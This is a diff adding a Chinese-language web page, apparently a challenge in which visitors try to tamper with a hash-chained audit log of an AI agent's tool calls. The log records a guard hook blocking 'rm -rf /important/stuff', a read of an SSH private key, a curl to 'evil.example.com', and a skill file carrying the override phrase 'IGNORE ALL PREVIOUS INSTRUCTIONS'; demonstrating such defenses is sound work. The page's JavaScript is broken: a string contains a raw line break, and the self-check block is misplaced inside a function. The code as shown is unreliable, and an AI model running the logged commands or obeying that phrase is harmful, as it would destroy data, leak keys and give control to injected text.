@@ -1,0 +1,174 @@
+<!DOCTYPE html>
+<html lang="zh">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>AgentState 篡改实验室 — 改得动算你赢</title>
+<style>
+  :root { --bg:#0d1117; --card:#161b22; --line:#30363d; --fg:#e6edf3; --dim:#8b949e;
+          --ok:#3fb950; --bad:#f85149; --accent:#58a6ff; }
+  * { box-sizing:border-box; }
+  body { background:var(--bg); color:var(--fg); font-family:"Segoe UI",system-ui,sans-serif;
+         max-width:900px; margin:0 auto; padding:24px 16px; }
+  h1 { font-size:1.6em; margin:.2em 0; }
+  .sub { color:var(--dim); margin-bottom:16px; }
+  #banner { position:sticky; top:0; z-index:9; padding:12px 16px; border-radius:8px;
+            font-size:1.1em; font-weight:600; margin-bottom:16px; border:1px solid var(--line); }
+  .clean  { background:#0d2818; color:var(--ok);  border-color:#1f6f37; }
+  .tamper { background:#3d1416; color:var(--bad); border-color:#803036; }
+  .card { background:var(--card); border:1px solid var(--line); border-radius:8px;
+          padding:12px 14px; margin-bottom:10px; }
+  .card.bad { border-color:var(--bad); }
+  .head { display:flex; justify-content:space-between; cursor:pointer; }
+  .L { color:var(--dim); font-size:.85em; }
+  .type { font-weight:600; color:var(--accent); }
+  .snip { color:var(--dim); font-size:.9em; margin-top:4px; word-break:break-all; }
+  .stat { font-size:.9em; }
+  .ok   { color:var(--ok); }
+  textarea { width:100%; min-height:120px; background:#0d1117; color:var(--fg);
+             border:1px solid var(--line); border-radius:6px; font-family:Consolas,monospace;
+             font-size:12px; padding:8px; }
+  button { background:#21262d; color:var(--fg); border:1px solid var(--line);
+           border-radius:6px; padding:6px 14px; cursor:pointer; margin:8px 8px 0 0; }
+  button:hover { border-color:var(--accent); }
+  .hint { color:var(--dim); font-size:.85em; }
+  code { background:#21262d; padding:2px 6px; border-radius:4px; }
+</style>
+</head>
+<body>
+<h1>AgentState 篡改实验室</h1>
+<div class="sub">下面是一条<b>真实的</b> AgentState 审计链（14 条记录，3 条是当场拦截的危险操作）。<br>
+规则：**用任何方式改掉任何内容，骗过验证器，就算你赢。** 全程在你的浏览器里完成，不上传任何东西。</div>
+<div id="banner" class="clean">✅ 链完好 — 还没有任何改动</div>
+<div>
+  <button onclick="location.reload()">🔄 恢复原链</button>
+  <button onclick="document.getElementById('how').style.display='block'">为什么改不动？</button>
+</div>
+<div id="how" style="display:none" class="card">
+  <p>每条记录的 <code>hash = sha256(前一条完整hash + 本条内容规范化JSON)</code>。</p>
+  <p>改一个字符 → 本条 hash 对不上；重算本条 → 下一条的 prev 对不上；全链重算 →
+     末行与链外日锚对不上。要无声无息改一条，你必须伪造从那条到今天的<b>整条链 + 链外锚</b>。</p>
+  <p>验证逻辑与 <code>verify.py</code>（60 行，仓库公开）完全一致——读懂它，构造任何攻击。</p>
+</div>
+<div id="chain"></div>
+<div class="hint">提示：点开卡片 → 编辑 JSON → 点「应用」。改 hash 本身等于伪造身份——链看的是内容。</div>
+
+<script>
+const CHAIN = [{"ts": "2026-09-23T20:56:20+08:00", "type": "hook_alive", "tool": "Bash", "session": "challenge", "host": "generic", "decision": "allow", "severity": "none", "reason": "first hook invocation of the day", "prev": "", "hash": "6d676f11faf4824fe6c470f813e1beea1418e1245f209682ebd90d4c76cd9f52"}, {"ts": "2026-09-23T20:56:20+08:00", "type": "pre_tool_use", "tool": "Bash", "session": "challenge", "host": "generic", "input": {"command": "echo hello antinel", "file_path": "", "content_len": 0}, "content_digest": "sha256:83e0d66480efed80f7c662320be0a15aaa3c0e8cbe12c61f9fc8c80592f108b9", "rules_hit": [], "severity": "none", "action": "allow", "decision": "allow", "prev": "ebd90d4c76cd9f52", "hash": "bf2d7dde0be360465f42b2be1e71798d44ffc32bcff1f5753db92900e1cb5bba"}, {"ts": "2026-09-23T20:56:23+08:00", "type": "pre_tool_use", "tool": "Write", "session": "challenge", "host": "generic", "input": {"command": "", "file_path": "C:\\Temp\\PGINST~1\\challenge_43c0zw_d\\proj\\note.txt", "content_len": 11}, "content_digest": "sha256:ac2dda9bc4fbced6fb347512dceb371ad3af7bba0e0fb085f53885a93b419e3b", "file_state_before": {"hash": "absent"}, "rules_hit": [], "severity": "none", "action": "allow", "decision": "allow", "prev": "3db92900e1cb5bba", "hash": "b06bdbbe431ce949f3a29eee668af8ba1d89d9f7809ea490daf30ca78c8302b5"}, {"ts": "2026-09-23T20:56:25+08:00", "type": "dst02_bash_path_suspect", "tool": "Bash", "session": "challenge", "host": "generic", "rule_id": "DST-02", "decision": "alert", "severity": "warning", "action": "alert", "reason": "command text references an explicit absolute path outside the project root; scripts are not parsed (THREAT_MODEL Non-goals)", "input": {"command": "rm -rf /important/stuff", "path": "/important/stuff"}, "prev": "daf30ca78c8302b5", "hash": "8b67dfa3c75f02a916ebb1c0cbc3a79670bd4cd2c54590ffd672e6cc139699b0"}, {"ts": "2026-09-23T20:56:25+08:00", "type": "pre_tool_use", "tool": "Bash", "session": "challenge", "host": "generic", "input": {"command": "rm -rf /important/stuff", "file_path": "", "content_len": 0}, "content_digest": "sha256:0fbe5b41c0804f822334d269c912c7c2a2805419fea7aaff85f96dd0c1bdd984", "rules_hit": ["DST-01"], "severity": "critical", "action": "block", "decision": "block", "match_kind": "command", "match_snippet": "rm", "prev": "d672e6cc139699b0", "hash": "c73cfd44882f5772aaff551ded255bbb80889a9b597ce138f88346af6a3df876"}, {"ts": "2026-09-23T20:56:25+08:00", "type": "pre_tool_use_summary", "tool": "Bash", "session": "challenge", "total_hits": 1, "decision": "block", "hits": [{"rule_id": "DST-01", "severity": "critical", "match_kind": "command", "snippet": "rm"}], "prev": "f88346af6a3df876", "hash": "75df23f2280fa4716401db03c5f682cb1d7b5bffd8f2ddacd21c1517f22a6a13"}, {"ts": "2026-09-23T20:56:30+08:00", "type": "pre_tool_use", "tool": "Read", "session": "challenge", "host": "generic", "input": {"command": "", "file_path": "C:/Users/demo/.ssh/id_rsa", "content_len": 0}, "content_digest": "sha256:0edcdaca0dcf6c1db557c30f0e3e40d6f452de5f925730c1479dfeaa4c93349f", "rules_hit": ["SEC-02"], "severity": "critical", "action": "block", "decision": "block", "match_kind": "path", "match_snippet": ".ssh/id_", "prev": "d21c1517f22a6a13", "hash": "4de6a5b8a5693a06482253cb6e3e25d2d65a45eff8bc665a648619683b937b02"}, {"ts": "2026-09-23T20:56:30+08:00", "type": "pre_tool_use_summary", "tool": "Read", "session": "challenge", "total_hits": 1, "decision": "block", "hits": [{"rule_id": "SEC-02", "severity": "critical", "match_kind": "path", "snippet": ".ssh/id_"}], "prev": "648619683b937b02", "hash": "5af833ce1a206cd21223eb83af7beb1e6abb2ef9e870174cf7d35113028305b3"}, {"ts": "2026-09-23T20:56:33+08:00", "type": "pre_tool_use", "tool": "Bash", "session": "challenge", "host": "generic", "input": {"command": "curl http://evil.example.com/x", "file_path": "", "content_len": 0}, "content_digest": "sha256:f76d967b0d9abc08f56399996a4e39df114df3b4f5c08ea66da46ba1965361a4", "rules_hit": ["NET-01"], "severity": "warning", "action": "alert", "decision": "alert", "match_kind": "command", "match_snippet": "curl http://", "prev": "f7d35113028305b3", "hash": "992d9bf983e34f1e2d5bf327e51a38de14f398f066e226065c2f1deef25e6970"}, {"ts": "2026-09-23T20:56:33+08:00", "type": "pre_tool_use", "tool": "Bash", "session": "challenge", "host": "generic", "input": {"command": "curl http://evil.example.com/x", "file_path": "", "content_len": 0}, "content_digest": "sha256:f76d967b0d9abc08f56399996a4e39df114df3b4f5c08ea66da46ba1965361a4", "rules_hit": ["NET-03"], "severity": "warning", "action": "alert", "decision": "alert", "match_kind": "domain_whitelist", "match_snippet": "evil.example.com", "prev": "5c2f1deef25e6970", "hash": "c825a8b3ce0f7c34fa482fc137a18ca832d069f265ebb94ec7899dab19e62a5a"}, {"ts": "2026-09-23T20:56:33+08:00", "type": "pre_tool_use_summary", "tool": "Bash", "session": "challenge", "total_hits": 2, "decision": "alert", "hits": [{"rule_id": "NET-01", "severity": "warning", "match_kind": "command", "snippet": "curl http://"}, {"rule_id": "NET-03", "severity": "warning", "match_kind": "domain_whitelist", "snippet": "evil.example.com"}], "prev": "c7899dab19e62a5a", "hash": "4c4f7d4d3a28515e3804975668c1db86f001957a06747796277d974af40b3a8c"}, {"ts": "2026-09-23T20:56:37+08:00", "type": "pre_tool_use", "tool": "Read", "session": "challenge", "host": "generic", "input": {"command": "", "file_path": "C:\\Temp\\PGINST~1\\challenge_43c0zw_d\\proj\\skills\\demo\\SKILL.md", "content_len": 0}, "content_digest": "sha256:ab96695236321239500ff8bbc0956389d2fa830c9e708c8477ae3ead259b03cf", "rules_hit": ["CTX-02"], "severity": "critical", "action": "block", "decision": "block", "match_kind": "file_content", "match_snippet": "IGNORE ALL PREVIOUS INSTRUCTIONS", "prev": "277d974af40b3a8c", "hash": "0ac7f8f47168cdcede6949087e8e7205f597d4bfd85ab2c37b9252407f020bde"}, {"ts": "2026-09-23T20:56:37+08:00", "type": "pre_tool_use_summary", "tool": "Read", "session": "challenge", "total_hits": 1, "decision": "block", "hits": [{"rule_id": "CTX-02", "severity": "critical", "match_kind": "file_content", "snippet": "IGNORE ALL PREVIOUS INSTRUCTIONS"}], "prev": "7b9252407f020bde", "hash": "196849f4b331f066a6b50431673f60e4e0766a848d029dcfa0dcc2d4b16d4830"}, {"ts": "2026-09-23T20:56:43+08:00", "type": "pre_tool_use", "tool": "Bash", "session": "challenge", "host": "generic", "input": {"command": "echo done", "file_path": "", "content_len": 0}, "content_digest": "sha256:02b7e1dcda9b298da4193ebf14bfc273bf4bdbdc903466bef53d0811181014ea", "rules_hit": [], "severity": "none", "action": "allow", "decision": "allow", "prev": "a0dcc2d4b16d4830", "hash": "72c79f961c34b0682a22be227336988f077d19a1bbfa0bf97286bea73d69843a"}];
+const ORIG = JSON.parse(JSON.stringify(CHAIN));
+
+// SHA-256（纯 JS 实现与 verify.py 的 hashlib.sha256 完全等价，输入 UTF-8 字节）
+function sha256hex(str){
+  var msg = Array.from(new TextEncoder().encode(str));
+  return sha256bytes(msg);
+}
+function sha256bytes(msg){
+  function rr(v,c){return (v>>>c)|(v<<(32-c));}
+  var H=[0x6a09e667,0xbb67ae85,0x3c6ef372,0xa54ff53a,0x510e527f,0x9b05688c,0x1f83d9ab,0x5be0cd19];
+  var KK=[0x428a2f98,0x71374491,0xb5c0fbcf,0xe9b5dba5,0x3956c25b,0x59f111f1,0x923f82a4,0xab1c5ed5,
+          0xd807aa98,0x12835b01,0x243185be,0x550c7dc3,0x72be5d74,0x80deb1fe,0x9bdc06a7,0xc19bf174,
+          0xe49b69c1,0xefbe4786,0x0fc19dc6,0x240ca1cc,0x2de92c6f,0x4a7484aa,0x5cb0a9dc,0x76f988da,
+          0x983e5152,0xa831c66d,0xb00327c8,0xbf597fc7,0xc6e00bf3,0xd5a79147,0x06ca6351,0x14292967,
+          0x27b70a85,0x2e1b2138,0x4d2c6dfc,0x53380d13,0x650a7354,0x766a0abb,0x81c2c92e,0x92722c85,
+          0xa2bfe8a1,0xa81a664b,0xc24b8b70,0xc76c51a3,0xd192e819,0xd6990624,0xf40e3585,0x106aa070,
+          0x19a4c116,0x1e376c08,0x2748774c,0x34b0bcb5,0x391c0cb3,0x4ed8aa4a,0x5b9cca4f,0x682e6ff3,
+          0x748f82ee,0x78a5636f,0x84c87814,0x8cc70208,0x90befffa,0xa4506ceb,0xbef9a3f7,0xc67178f2];
+  var l = msg.length;
+  msg.push(0x80);
+  while (msg.length % 64 !== 56) msg.push(0);
+  var bitLenHi = Math.floor(l / 0x20000000), bitLenLo = (l << 3) >>> 0;
+  msg.push(bitLenHi>>>24&255, bitLenHi>>>16&255, bitLenHi>>>8&255, bitLenHi&255,
+           bitLenLo>>>24&255, bitLenLo>>>16&255, bitLenLo>>>8&255, bitLenLo&255);
+  var w = new Array(64);
+  for (var off = 0; off < msg.length; off += 64) {
+    for (var i = 0; i < 16; i++)
+      w[i] = (msg[off+i*4]<<24)|(msg[off+i*4+1]<<16)|(msg[off+i*4+2]<<8)|(msg[off+i*4+3]);
+    for (i = 16; i < 64; i++) {
+      var s0 = rr(w[i-15],7)^rr(w[i-15],18)^(w[i-15]>>>3);
+      var s1 = rr(w[i-2],17)^rr(w[i-2],19)^(w[i-2]>>>10);
+      w[i] = (w[i-16]+s0+w[i-7]+s1)|0;
+    }
+    var a=H[0],b=H[1],c=H[2],d=H[3],e=H[4],f=H[5],g=H[6],h=H[7];
+    for (i = 0; i < 64; i++) {
+      var S1 = rr(e,6)^rr(e,11)^rr(e,25);
+      var ch = (e&f)^(~e&g);
+      var t1 = (h+S1+ch+KK[i]+w[i])|0;
+      var S0 = rr(a,2)^rr(a,13)^rr(a,22);
+      var mj = (a&b)^(a&c)^(b&c);
+      var t2 = (S0+mj)|0;
+      h=g; g=f; f=e; e=(d+t1)|0; d=c; c=b; b=a; a=(t1+t2)|0;
+    }
+    H[0]=(H[0]+a)|0; H[1]=(H[1]+b)|0; H[2]=(H[2]+c)|0; H[3]=(H[3]+d)|0;
+    H[4]=(H[4]+e)|0; H[5]=(H[5]+f)|0; H[6]=(H[6]+g)|0; H[7]=(H[7]+h)|0;
+  }
+  return H.map(function(x){return (x>>>0).toString(16).padStart(8,'0');}).join('');
+}
+
+function canon(rec){
+  var body = {};
+  Object.keys(rec).sort().forEach(function(k){ if(k!=="hash") body[k]=rec[k]; });
+  return JSON.stringify(body);
+}
+function chainHash(rec, prevFull){
+  return sha256hex(prevFull + canon(rec));
+}
+
+var state = CHAIN.map(function(r){ return JSON.parse(JSON.stringify(r)); });
+var tampered = 0;
+
+function esc(s){ var d=document.createElement("div"); d.textContent=s; return d.innerHTML; }
+
+function render(){
+  var el = document.getElementById("chain");
+  el.innerHTML = "";
+  var prevFull = "";
+  var nBad = 0;
+  state.forEach(function(rec, idx){
+    var want = chainHash(rec, prevFull);
+    var hashOK = (rec.hash === want);
+    var prevOK = (rec.prev === prevFull.slice(-16));
+    if (!hashOK || !prevOK) nBad++;
+    var card = document.createElement("div");
+    card.className = "card" + (hashOK && prevOK ? "" : " bad");
+    var snip = rec.match_snippet || (rec.input && (rec.input.command || rec.input.file_path)) || "";
+    card.innerHTML =
+      '<div class="head" onclick="toggle(' + idx + ')">' +
+        '<div><span class="L">L' + (idx+1) + '</span> <span class="type">' + esc(rec.type||"?") +
+        '</span> <span class="L">' + esc((rec.ts||"").slice(11,19)) + '</span></div>' +
+        '<div class="stat">' + (hashOK&&prevOK ? '<span class="ok">✓ 完好</span>' : '<span style="color:var(--bad)">✗ 被改动</span>') + '</div>' +
+      '</div>' +
+      '<div class="snip">' + esc(String(snip).slice(0,60)) + '</div>' +
+      '<div id="ed' + idx + '" style="display:none;margin-top:8px">' +
+        '<textarea id="ta' + idx + '">' + esc(JSON.stringify(rec, null, 1)) + '</textarea><br>' +
+        '<button onclick="apply(' + idx + ')">应用修改</button>' +
+        '<span class="hint"> 提示：改内容后自己重算 hash 是没用的——下一条的 prev 会出卖你</span>' +
+      '</div>';
+    el.appendChild(card);
+    prevFull = rec.hash || "";
+  });
+  var banner = document.getElementById("banner");
+  if (nBad === 0) { banner.className = "clean"; banner.textContent = "✅ 链完好 — 还没有任何改动（或你的攻击已被全部识别）"; }
+  else { banner.className = "tamper"; banner.textContent = "🔴 检出篡改 " + nBad + " 处 — 你被当场指认了"; tampered = nBad; }
+}
+function toggle(i){ var e = document.getElementById("ed"+i); e.style.display = e.style.display==="none"?"block":"none"; }
+function apply(i){
+  try {
+    state[i] = JSON.parse(document.getElementById("ta"+i).value);
+  } catch(e) { alert("JSON 不合法：
+" + e.message); return; }
+  render();
+// 自检：SHA-256 实现正确性（标准测试向量 abc）
+var _st = sha256hex("abc");
+var _stOK = (_st === "ba7816bf8f01cfea414140de5dae2223b00361a396177a9cb410ff61f20015ad");
+if (!_stOK) {
+  var w = document.createElement("div");
+  w.className = "tamper"; w.style.padding = "10px";
+  w.textContent = "⚠ 内部自检失败：本浏览器 SHA-256 实现异常，本页验证结果不可信。" + _st;
+  document.body.insertBefore(w, document.getElementById("banner"));
+}
+
+}
+render();
+</script>
+</body>
+</html>
